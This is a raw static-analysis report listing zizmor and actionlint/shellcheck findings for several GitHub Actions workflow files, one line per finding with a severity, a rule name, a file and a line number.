191109080b2eb3e9 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L625
191109080b2eb3e9 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L625
191109080b2eb3e9 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L625
191109080b2eb3e9 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L625
191109080b2eb3e9 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L625
cc8b34181a4faee1 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L630
55d07e5a0cf7cdb4 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L651
e94a8e5a58c56cf5 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L657
998dcd599351aa3e severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L752
e70096e37a988392 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L863
bd295bf350b20950 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L927
f27be52ba3421427 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L928
e19e4c68fe8bf6cf severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/aeon.yml step=L931
a705f2ba32116b29 severity=Critical status=manual rule=zizmor/unpinned-uses file=.github/workflows/aeon.yml step=L85
207fb144374c8df9 severity=Critical status=manual rule=zizmor/unpinned-uses file=.github/workflows/aeon.yml step=L121
8a8cd7bbfa79f988 severity=Critical status=manual rule=zizmor/unpinned-uses file=.github/workflows/aeon.yml step=L133
afa8e08b7c90e8a2 severity=Low status=manual rule=zizmor/undocumented-permissions file=.github/workflows/aeon.yml step=L77
ac7c8e53b643ff7f severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/aeon.yml step=L72
d2fc7a994dfa1fec severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/chain-runner.yml step=Checkout_repo
09b0d6449d9fedfa severity=Low status=manual rule=zizmor/undocumented-permissions file=.github/workflows/chain-runner.yml step=L24
224fd3fdf42f906c severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/chain-runner.yml step=L20
24ce1314d3ccd821 severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/chain-runner.yml step=L29
40bdb58d37c88eae severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/chain-runner.yml step=L31
de5a56c1610342e3 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/chain-runner.yml step=L40
4c23f13edd9f035f severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/chain-runner.yml step=L288
5fb8018264503d02 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/chain-runner.yml step=L347
66f9cf0a3bdec2c3 severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/fleet-runner.yml step=Checkout
4213c12e5455c402 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L157
5ccae3c857a2c85b severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L158
89f8b46162713068 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L160
e42ff9a15cb5671d severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L161
643c46fc9c02d0c8 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L162
ada3e0f433913ff1 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L163
22c64992b9467792 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L322
22c64992b9467792 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L322
d14562741c103324 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L342
d14562741c103324 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L342
d0b486aef73dcdaf severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L354
a6484b02473cb89b severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/fleet-runner.yml step=L355
1e36addeed372299 severity=Low status=manual rule=zizmor/undocumented-permissions file=.github/workflows/fleet-runner.yml step=L55
7617f99e3fc60eae severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/fleet-runner.yml step=L51
65dfb0d6a99b96ff severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/fleet-runner.yml step=L64
be7be4aca4586329 severity=Low status=manual rule=zizmor/concurrency-limits file=.github/workflows/fleet-runner.yml step=L4
fe9737530e3a4feb severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L157
63196b1b714be88c severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L158
e69863eb51b539d4 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L160
8fdec61e03d443dc severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L161
dbd42ef0b43759f4 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L162
2920b86590e37f1f severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L163
e2f9a75bd9489283 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L278
9aa709f676e52e66 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L279
c1d5bbd6eb3b2329 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L294
ef0b0fbb72713d4d severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/fleet-runner.yml step=L361
e72ec7b01ceba83b severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/gitlawb-repo-bootstrap.yml step=L80
d50c9d761b162941 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/gitlawb-repo-bootstrap.yml step=L85
c70499a46248bb93 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/gitlawb-repo-bootstrap.yml step=L86
8d84965d7ff68368 severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/gitlawb-repo-bootstrap.yml step=L39
024d092e2be757bb severity=Low status=manual rule=zizmor/concurrency-limits file=.github/workflows/gitlawb-repo-bootstrap.yml step=description:_"Repo_name_to_create_on_the_GitLawb_node
8e9c1249c7180da2 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/gitlawb-repo-bootstrap.yml step=L80
3c0dd7a7ae04b5bb severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/gitlawb-repo-bootstrap.yml step=L85
5b43eb03e403bb19 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/gitlawb-repo-bootstrap.yml step=L86
20e02889fa19245c severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/lint.yml step=Checkout
20e02889fa19245c severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/lint.yml step=Checkout
20e02889fa19245c severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/lint.yml step=Checkout
f0fcf23242a3a207 severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/lint.yml step=L33
0ae39681ddd27d1c severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/lint.yml step=L71
dedd2a9e77e73426 severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/lint.yml step=L92
026cbff74a338284 severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/messages.yml step=Checkout_repo
026cbff74a338284 severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/messages.yml step=Checkout_repo
916a852b69b68eff severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/messages.yml step=L670
7d792ea5b9bb05bd severity=Low status=manual rule=zizmor/undocumented-permissions file=.github/workflows/messages.yml step=L658
d60446c58ca5a7ca severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/messages.yml step=L47
c810f3b261360e9b severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/messages.yml step=L651
102d6ef1db150d03 severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/messages.yml step=L57
533fe184ac8960a6 severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/messages.yml step=L693
8821880642ea614c severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L59
0c68b51ff2130b0f severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L68
d9b73f80c1b0f155 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L551
d0e430ce698651f8 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L552
7e00233dda43e063 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L553
47422077eea44b16 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L554
4011c326e6da9041 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L555
44bea1cfd8a85fbc severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L556
d7f1fe42ecd2e7b0 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L557
580dfcb58185ccfb severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L648
f5b3958ae0ed441a severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L695
5209ff37d3f94a64 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L717
1b27353e999de469 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L718
5287ba32c4818241 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L719
16f6600b26be497f severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L720
85ff69765dd971f5 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L721
46d891fe352e6418 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L722
6f0fe6a0ef94db0c severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L723
c45a2a9a5139f8ad severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L724
09fecd3d5aa6d9f0 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L725
05baf9ead1587334 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L726
976f8f6b4fe0bc33 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L727
4452423e13db159f severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L728
ef187900f1981cad severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L729
abb4bbcdcdb0bbde severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L730
5aa4e333ce9ada90 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L731
e65b70d49c09b348 severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/messages.yml step=L889
e227de85a27cbd59 severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/sync-aeon-public-results.yml step=Checkout_aeon
666c5b5e20d987b9 severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/sync-aeon-public-results.yml step=L23
d6b5b7c03579933a severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/sync-aeon-public-results.yml step=L29
7c001f1bd15a8a23 severity=Medium status=manual rule=zizmor/artipacked file=.github/workflows/sync-upstream.yml step=Checkout_fork
4365a1927be42d6e severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/sync-upstream.yml step=L71
e01fa430d6dec75f severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/sync-upstream.yml step=L78
6392ea21c8b0e5c6 severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/sync-upstream.yml step=L79
9f0b3baa328a350b severity=Low status=manual rule=zizmor/template-injection file=.github/workflows/sync-upstream.yml step=L80
4476d5a7e13134b5 severity=Low status=manual rule=zizmor/undocumented-permissions file=.github/workflows/sync-upstream.yml step=L19
3f6d242d803a9761 severity=Low status=manual rule=zizmor/anonymous-definition file=.github/workflows/sync-upstream.yml step=L16
1520234f8fcc172f severity=High status=manual rule=zizmor/ref-version-mismatch file=.github/workflows/sync-upstream.yml step=L23
70d61ff8cb15636d severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/sync-upstream.yml step=L29
02849b4b22263ffc severity=High status=manual rule=zizmor/secrets-outside-env file=.github/workflows/sync-upstream.yml step=L76
0255635a6c12c703 severity=Medium status=manual rule=actionlint/shellcheck/SC2129 file=.github/workflows/aeon.yml step=SC2129:L286
2d9e1020fb37b600 severity=Medium status=manual rule=actionlint/shellcheck/SC2129 file=.github/workflows/aeon.yml step=SC2129:L601
7fbcfbf6f94d70ea severity=Medium status=manual rule=actionlint/shellcheck/SC2034 file=.github/workflows/chain-runner.yml step=SC2034:L42
7635603ae7ab5a80 severity=Medium status=manual rule=actionlint/shellcheck/SC2129 file=.github/workflows/chain-runner.yml step=SC2129:L42
7635603ae7ab5a80 severity=Medium status=manual rule=actionlint/shellcheck/SC2129 file=.github/workflows/chain-runner.yml step=SC2129:L42
6d07f1a8d9b9cd1d severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/chain-runner.yml step=SC2155:L42
6d07f1a8d9b9cd1d severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/chain-runner.yml step=SC2155:L42
6d07f1a8d9b9cd1d severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/chain-runner.yml step=SC2155:L42
6d07f1a8d9b9cd1d severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/chain-runner.yml step=SC2155:L42
6d07f1a8d9b9cd1d severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/chain-runner.yml step=SC2155:L42
a7f35ffd56f9fd84 severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/fleet-runner.yml step=SC2155:L186
a7f35ffd56f9fd84 severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/fleet-runner.yml step=SC2155:L186
a7f35ffd56f9fd84 severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/fleet-runner.yml step=SC2155:L186
a7f35ffd56f9fd84 severity=Medium status=manual rule=actionlint/shellcheck/SC2155 file=.github/workflows/fleet-runner.yml step=SC2155:L186
7a317867bd2ec5a6 severity=Medium status=manual rule=actionlint/shellcheck/SC2086 file=.github/workflows/fleet-runner.yml step=SC2086:L301
7a317867bd2ec5a6 severity=Medium status=manual rule=actionlint/shellcheck/SC2086 file=.github/workflows/fleet-runner.yml step=SC2086:L301
442b08b6e74e546d severity=Medium status=manual rule=actionlint/shellcheck/SC2034 file=.github/workflows/messages.yml step=SC2034:L69
acd63f72d218312a severity=Medium status=manual rule=actionlint/shellcheck/SC2129 file=.github/workflows/messages.yml step=SC2129:L669
29b17c2e50dd336d severity=Medium status=manual rule=actionlint/shellcheck/SC2129 file=.github/workflows/messages.yml step=SC2129:L734
909e21530c20cc7b severity=Medium status=manual rule=actionlint/shellcheck/SC2129 file=.github/workflows/messages.yml step=SC2129:L815
-->
